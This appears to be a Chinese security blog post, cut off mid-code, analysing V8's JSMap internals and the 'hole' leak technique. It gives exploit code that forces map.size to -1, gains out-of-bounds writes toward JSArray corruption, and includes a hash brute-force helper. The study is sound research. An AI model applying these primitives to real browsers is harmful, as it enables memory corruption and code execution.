<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>V8-Hole漏洞 | Small Utopia</title><meta name="author" content="Eutopia"><meta name="copyright" content="Eutopia"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="对于V8 Hole相关内容的学习V8 Map对象的分析可以看这篇搬运：V8-Map对象 V8源码分析在v8中，JSMap的内存布局如下：   Map：每个对象会有的，包含对象属性的shape； FixedArray Length：整个OrderdHashMap的大小 elements：存在的entry的数量 deleteds：删除的entry数量 buckets：buckets数量考虑如下代码：1">
<meta property="og:type" content="article">
<meta property="og:title" content="V8-Hole漏洞">
<meta property="og:url" content="https://eknight-eutopia.github.io/posts/332a3199.html">
<meta property="og:site_name" content="Small Utopia">
<meta property="og:description" content="对于V8 Hole相关内容的学习V8 Map对象的分析可以看这篇搬运：V8-Map对象 V8源码分析在v8中，JSMap的内存布局如下：   Map：每个对象会有的，包含对象属性的shape； FixedArray Length：整个OrderdHashMap的大小 elements：存在的entry的数量 deleteds：删除的entry数量 buckets：buckets数量考虑如下代码：1">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://eknight-eutopia.github.io/img/cover/default_cover%20(16).jpg">
<meta property="article:published_time" content="2025-09-08T16:00:00.000Z">
<meta property="article:modified_time" content="2025-11-06T09:33:24.160Z">
<meta property="article:author" content="Eutopia">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://eknight-eutopia.github.io/img/cover/default_cover%20(16).jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://eknight-eutopia.github.io/posts/332a3199.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        if (name && globalFn[key][name]) return
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?b2bb076b3ca994b59d55f4681f7e3427";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
btf.addGlobalFn('pjaxComplete', () => {
  _hmt.push(['_trackPageview',window.location.pathname])
}, 'baidu_analytics')
</script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400,"highlightFullpage":true,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'V8-Hole漏洞',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-11-06 17:33:24'
}</script><link rel="stylesheet" href="/config/css/transparancy.css"><link rel="stylesheet" href="/config/css/edit-icon-anime.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/background.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">114</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">55</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-blog"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/sitetime"><i class="fa-fw fas fa-hourglass-end"></i><span> 时间轴</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw far fa-paper-plane"></i><span> 关于</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent;"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Small Utopia</span></a><a class="nav-page-title" href="/"><span class="site-name">V8-Hole漏洞</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-blog"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/sitetime"><i class="fa-fw fas fa-hourglass-end"></i><span> 时间轴</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw far fa-paper-plane"></i><span> 关于</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">V8-Hole漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-09-08T16:00:00.000Z" title="发表于 2025-09-09 00:00:00">2025-09-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-11-06T09:33:24.160Z" title="更新于 2025-11-06 17:33:24">2025-11-06</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">1.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>7分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>对于V8 Hole相关内容的学习<br>V8 Map对象的分析可以看这篇搬运：<a href="2025-09-09-V8-Map%E5%AF%B9%E8%B1%A1%E5%AD%A6%E4%B9%A0.md">V8-Map对象</a></p>
<h2 id="V8源码分析"><a href="#V8源码分析" class="headerlink" title="V8源码分析"></a>V8源码分析</h2><p>在v8中，JSMap的内存布局如下：</p>
<img src="/posts/332a3199/file-20250909162249728.png" class="">
<ul>
<li>Map：每个对象会有的，包含对象属性的shape；</li>
<li>FixedArray Length：整个OrderdHashMap的大小</li>
<li>elements：存在的entry的数量</li>
<li>deleteds：删除的entry数量</li>
<li>buckets：buckets数量<br>考虑如下代码：<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();  </span><br><span class="line">  </span><br><span class="line">%<span class="title class_">DebugPrint</span>(map);  </span><br><span class="line"><span class="title function_">readline</span>();  </span><br><span class="line">  </span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">1</span>, <span class="number">1</span>);  </span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">2</span>, <span class="number">1</span>);  </span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">3</span>, <span class="number">1</span>);  </span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">4</span>, <span class="number">1</span>);  </span><br><span class="line">%<span class="title class_">DebugPrint</span>(map);  </span><br><span class="line"><span class="title function_">readline</span>();  </span><br><span class="line">  </span><br><span class="line">map.<span class="title function_">delete</span>(<span class="number">3</span>);  </span><br><span class="line">%<span class="title class_">DebugPrint</span>(map);  </span><br><span class="line"><span class="title function_">readline</span>();  </span><br><span class="line">  </span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">5</span>, <span class="number">1</span>);  </span><br><span class="line">%<span class="title class_">DebugPrint</span>(map);  </span><br><span class="line"><span class="title function_">readline</span>();</span><br></pre></td></tr></table></figure>
调试查看内容如下：<br>第一次%DebugPrint(map)：<img src="/posts/332a3199/file-20250909164651651.png" class="">
查看其OrderedHashMap内容：<img src="/posts/332a3199/file-20250909165215831.png" class="">
可以发现其初始时elements和deleteds都是0，buckets为2。<br>hashTable为0xffffffff<br>dataTable则为0x2b0c3e9004d1（应该是未初始化），有12个，每个entry占3x8字节，因此总容量为4个entry。即2*buckets。<br>第二次添加四个元素后%DebugPrint(map)：<img src="/posts/332a3199/file-20250909165612954.png" class="">
elements变为4个<br>hashTable有0x2和0x3<br>dataTable对应内容为<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="attr">key</span>: <span class="number">1</span>,</span><br><span class="line">		<span class="attr">value</span>: <span class="number">1</span>,</span><br><span class="line">		<span class="attr">chain</span>: -<span class="number">1</span>,</span><br><span class="line">	&#125;,</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="attr">key</span>: <span class="number">2</span>,</span><br><span class="line">		<span class="attr">value</span>: <span class="number">1</span>,</span><br><span class="line">		<span class="attr">chain</span>: -<span class="number">1</span>,</span><br><span class="line">	&#125;,</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="attr">key</span>: <span class="number">3</span>,</span><br><span class="line">		<span class="attr">value</span>: <span class="number">1</span>,</span><br><span class="line">		<span class="attr">chain</span>: <span class="number">0</span>,</span><br><span class="line">	&#125;</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="attr">key</span>: <span class="number">4</span>,</span><br><span class="line">		<span class="attr">value</span>: <span class="number">1</span>,</span><br><span class="line">		<span class="attr">chain</span>: <span class="number">1</span>,</span><br><span class="line">	&#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
似乎和前面的分析文章不同，将后来插入的放到了buckets的头部。<br>第三次删除（3,1）后%DebugPrint(map)：<img src="/posts/332a3199/file-20250909170244656.png" class="">
elements变为3，deleteds变为1<br>key&#x3D;3的位置变为undefined，也即是#hole，hashTable并没有改变。<br>用一下kanxue的参考文章作为示例：<img src="/posts/332a3199/file-20250909170430713.png" class="">
第四次添加新元素%DebugPrint(map)：<img src="/posts/332a3199/file-20250909170747446.png" class="">
可以发现OrderedHashMap发生变化，变成31长度，即发生扩容。<img src="/posts/332a3199/file-20250909170847420.png" class="">
扩容后buckets变为0x4，elements为4。<br>hashTable则变为了0x1, 0x0，0x3，然后发现dataTable内容中deleted_entry去除掉了。</li>
</ul>
<h3 id="map-set"><a href="#map-set" class="headerlink" title="map.set"></a>map.set</h3><p>map.set(key, value)的作用是给map添加元素。其接口处理逻辑如下：</p>
<ul>
<li>检查Key是否存在；</li>
<li>若不存在空闲entry，则进行扩容，然后填充entry；</li>
<li>若存在空闲的entry，则直接填充；</li>
<li>若key存在，则直接更新；</li>
<li>若key不存在，则检查是否存在空闲key<br>这里使用TryLookupOrderedHashTableIndex函数去寻找key对应的entry，及判断key是否存在：<br>对于不同类型的key，有着不同的寻找方式，这里以Smi类型的Key为例，对于Smi类型的Key寻找其entry利用的函数时FindOrderedHashTableEntryForSmiKey，该函数主要逻辑为利用ComputeIntegerHash计算Key的哈希值，然后再用FindOrderedHashTableEntry进行查找.</li>
</ul>
<h3 id="map-delete"><a href="#map-delete" class="headerlink" title="map.delete"></a>map.delete</h3><p>map.delete(key)作用为删除对应元素，其接口处理逻辑如下：</p>
<ul>
<li>删除对应key的entry，标记为已删除，修改entry的key，value为hole constant</li>
<li>修改elements，deleted值</li>
<li>查看elements是否小于buckets &#x2F; 2，如果是则进行shrink</li>
<li>rehash重新分配一个new_table</li>
</ul>
<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>hole泄漏如何利用JSMap进行攻击。<br>Hole是JS内部的一种数据类型，用来标记不存在的元素，这个数据类型通常是不能泄露到用户JS层面。Hole类型的漏洞利用是指由于内部数据结构通过漏洞被暴露至用户JS层，因此可以根据Hole创建一个长度为-1的JSMap结构，导致越界读写，从而实现RCE。<br>根据前面分析，我们知道当使用map.delete删除一个元素时，只是将该元素的key，value设置为hole，并没有实际地删除该元素，实际上只是做了标记，当进行shrink操作时，这些被hole标记的元素才会被真正删除。那么如果我们可以创建key&#x3D;hole的元素，那么我们就可以多次删除元素从而导致map.size为-1（当然这里前提是不进行shrink操作，因为shrink操作会清除hole元素）。<br>考虑如下代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();    </span><br><span class="line"><span class="keyword">let</span> hole = %<span class="title class_">TheHole</span>();</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">set</span>(hole, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(map.<span class="property">size</span>);</span><br><span class="line"><span class="comment">// 输出：</span></span><br><span class="line"><span class="comment">// -1</span></span><br></pre></td></tr></table></figure>
<img src="/posts/332a3199/file-20250909174119641.png" class="">
<p>调试可以发现elements变为-1。<br>但是如果是如下代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();    </span><br><span class="line"><span class="keyword">let</span> hole = %<span class="title class_">TheHole</span>();</span><br><span class="line">map.<span class="title function_">set</span>(hole, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(map.<span class="property">size</span>);</span><br><span class="line"><span class="comment">// 输出：</span></span><br><span class="line"><span class="comment">// 0</span></span><br></pre></td></tr></table></figure>
<p>因为这样在删除一次hole后，elements &#x3D; 0，buckets &#x3D; 2，导致发生shrink，则hole元素会被删除。<br>接下来则是进行OOB。<br>如果我们继续向map中添加元素，在之前set操作分析中，当添加一个新元素时，new entry寻找方式为&amp;hashTable + buckets + occupancy * 3，这里occupancy &#x3D; elements + deleted。在构造map.size &#x3D; -1后，相关字段为：elements &#x3D; -1, deleted &#x3D; 0, buckets &#x3D; 2。所以new_entry &#x3D; &amp;hashTable + 2 + (-1 + 0)  * 3 &#x3D; &amp;hashTable - 1 &#x3D; hashTable[-1] &#x3D; &amp;buckets<br>所以new_entry &#x3D; key|value|chain &#x3D; buckets|hashTable[0]|hashTable[1]，即下一次添加新元素时，就可以修改buckets &#x3D; key1、hashTable[0] &#x3D; value1<br>然后我们再添加新元素，此时：new_entry &#x3D; &amp;hashTable + buckets + (0 + 0) * 3 &#x3D; hashTable[key1]， 而key1我们可以控制，所以new_entry也是可控的，从而越界写key&#x2F;value，这里一般就是去写JSArray的length字段。但是需要注意的是，在set操作中，当对bucket链表进行遍历时会进行检查，所以我们需要使bucket[hash(key) &amp; (buckets - 1)] &#x3D; -1从而避免遍历bucket链表。<br>构造好map.size &#x3D; -1后，第一次添加新元素时无所谓的，因为此时bucket[0] &#x3D; -1、bucket[1] &#x3D; -1，但是第二次就需要注意了，第一次添加时会导致bucket[0] !&#x3D; -1或者bucket[1] !&#x3D; -1，但是其实bucket[0] &#x3D; value1，所以可以让bucket[0] &#x3D; value1 &#x3D; -1，这样在第二次添加时我们只需要让：hash(key2) &amp; (buckets - 1) &#x3D; 0即可，这里到时候爆破一下即可。<br>模版如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line"><span class="keyword">var</span> hole = <span class="title function_">leak_hole</span>();</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">set</span>(hole, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(<span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">set</span>(oob_write_offset, -<span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> oob_array = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> obj_arr = [&#123;&#125;];</span><br><span class="line"><span class="keyword">var</span> float_arr = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> rw_arr = [<span class="number">1.1</span>];</span><br><span class="line">map.<span class="title function_">set</span>(key2, value2);</span><br><span class="line"><span class="comment">// 其中hashTable[oob_write_offset + 3] = 预被修改的地址</span></span><br><span class="line"><span class="comment">// hashTable[oob_write_offset + 3] = key2</span></span><br><span class="line"><span class="comment">// 也可以用value2去控制</span></span><br><span class="line"><span class="comment">// 但是打JSArray的length字段时，还是用key2去写length</span></span><br><span class="line"><span class="comment">// 因为如果用value2去写length的话，elements会被key2覆盖</span></span><br></pre></td></tr></table></figure>
<p>key2爆破脚本，这里ComputeUnseededHash函数以实际V8源码为准：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span>  </span></span><br><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">ComputeUnseededHash</span><span class="params">(<span class="type">uint32_t</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> hash = key;</span><br><span class="line">    hash = ~hash + (hash &lt;&lt; <span class="number">15</span>);</span><br><span class="line">    hash = hash ^ (hash &gt;&gt; <span class="number">12</span>);</span><br><span class="line">    hash = hash + (hash &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    hash = hash ^ (hash &gt;&gt; <span class="number">4</span>);</span><br><span class="line">    hash = hash * <span class="number">2057</span>;</span><br><span class="line">    hash = hash ^ (hash &gt;&gt; <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> hash &amp; <span class="number">0x3fffffff</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> key = <span class="number">0x2000</span>, buckets = <span class="number">0x25</span>;</span><br><span class="line">    <span class="keyword">while</span> ((<span class="built_in">ComputeUnseededHash</span>(key) &amp; (buckets - <span class="number">1</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">	    key++;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%#xn&quot;</span>, key);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="相关例题"><a href="#相关例题" class="headerlink" title="相关例题"></a>相关例题</h2><p>一般思路为利用漏洞把hole泄漏出来，后面基本上是一样的。这里直接用%TheHole()来获取Hole。演示利用手法：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;log&#125; = <span class="variable language_">console</span>;</span><br><span class="line"><span class="keyword">var</span> raw_buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> d_buf = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(raw_buf);</span><br><span class="line"><span class="keyword">var</span> l_buf = <span class="keyword">new</span> <span class="title class_">BigInt64Array</span>(raw_buf);</span><br><span class="line"><span class="keyword">let</span> <span class="title function_">d2l</span> = (<span class="params">v</span>) =&gt; &#123;</span><br><span class="line">	d_buf[<span class="number">0</span>] = v;</span><br><span class="line">    <span class="keyword">return</span> l_buf[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> <span class="title function_">l2d</span> = (<span class="params">v</span>) =&gt; &#123;</span><br><span class="line">	l_buf[<span class="number">0</span>] = v;</span><br><span class="line">    <span class="keyword">return</span> d_buf[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> <span class="title function_">hexx</span> = (<span class="params">str, v</span>) =&gt; &#123;</span><br><span class="line"><span class="title function_">log</span>(<span class="string">&quot;&amp;#x0;33[32m&quot;</span>+str+<span class="string">&quot;: &amp;#x0;33[0m0x&quot;</span>+v.<span class="title function_">toString</span>(<span class="number">16</span>)); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">let</span> <span class="title function_">decc</span> = (<span class="params">str, v</span>) =&gt; &#123;</span><br><span class="line"><span class="title function_">log</span>(<span class="string">&quot;&amp;#x0;33[32m&quot;</span>+str+<span class="string">&quot;: &amp;#x0;33[0m&quot;</span>+v);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line"><span class="keyword">const</span> hole = %<span class="title class_">TheHole</span>();</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">set</span>(hole, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(<span class="number">1</span>);</span><br><span class="line"><span class="title function_">decc</span>(<span class="string">&quot;map.size&quot;</span>, map.<span class="property">size</span>);</span><br><span class="line"></span><br><span class="line">map.<span 